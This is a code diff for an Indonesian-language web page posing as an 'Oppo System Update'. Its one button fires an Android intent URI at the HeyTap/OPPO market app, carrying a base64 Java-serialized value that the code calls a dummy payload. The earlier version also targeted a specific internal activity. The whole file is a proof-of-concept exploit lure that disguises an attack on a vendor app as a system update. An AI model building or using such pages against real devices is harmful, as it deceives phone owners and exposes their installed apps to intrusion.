@@ -1,12 +1,31 @@
-<script>
-    document.getElementById('updateBtn').onclick = function() {
-        // Payload dummy dalam base64
-        const payload = "rO0ABXNyABFpbnZhbGlkLnBheWxvYWQAAAAAAAAAAQIAAHhw";
-        
-        // Konstruksi Intent URI yang lebih kuat untuk memaksa browser bereaksi
-        const intentUrl = "intent://add?ckey=test&cb=" + payload + "#Intent;scheme=oaps;package=com.heytap.market;component=com.heytap.market/com.cdo.oaps.api.host.WebBridgeBgActivity;S.browser_fallback_url=https%3A%2F%2Fgoogle.com;end";
-        
-        console.log("Memicu Intent: " + intentUrl);
-        window.location.href = intentUrl;
-    };
-</script>
+<!DOCTYPE html>
+<html>
+<head><title>Oppo System Update</title></head>
+<body style="text-align: center; font-family: sans-serif; padding-top: 50px;">
+    <h2>Pembaruan Komponen Sistem</h2>
+    <p id="status">Klik tombol di bawah untuk memulai.</p>
+    
+    <button id="updateBtn" style="padding: 15px 30px; font-size: 18px; color: white; background-color: #008f39; border: none; border-radius: 5px; cursor: pointer;">
+        Update Sekarang
+    </button>
+
+    <script>
+        document.getElementById('updateBtn').onclick = function() {
+            document.getElementById('status').innerText = "Sedang memicu sistem...";
+            
+            // Payload dummy
+            const payload = "rO0ABXNyABFpbnZhbGlkLnBheWxvYWQAAAAAAAAAAQIAAHhw";
+            
+            // Skema Intent yang paling umum digunakan untuk memicu aplikasi dari Chrome
+            const intentUrl = "intent://add?ckey=test&cb=" + payload + "#Intent;scheme=oaps;package=com.heytap.market;S.browser_fallback_url=https%3A%2F%2Fwww.google.com;end";
+
+            try {
+                window.location.href = intentUrl;
+                document.getElementById('status').innerText = "Intent dikirim! Periksa HP/Logcat.";
+            } catch (e) {
+                document.getElementById('status').innerText = "Error: " + e.message;
+            }
+        };
+    </script>
+</body>
+</html>
